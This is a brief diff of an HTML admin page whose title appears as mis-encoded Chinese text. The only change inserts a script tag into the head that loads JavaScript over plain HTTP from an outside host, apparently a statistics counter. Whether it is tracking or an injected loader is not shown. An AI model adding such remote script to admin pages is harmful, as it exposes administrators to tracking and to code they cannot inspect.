@@ -7,7 +7,7 @@
 <meta http-equiv="Content-Type" content="text/html" />
 <link rel="stylesheet" type="text/css" href="adminsty.css" />
 <title>°å¿é¸üÐÂ</title>
-</head><body>
+<script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head><body>
 <script language="JavaScript" type="text/javascript">
     var lang = navigator.language || navigator.userLanguage;
     if (lang.substr(0, 3) == "zh-") {
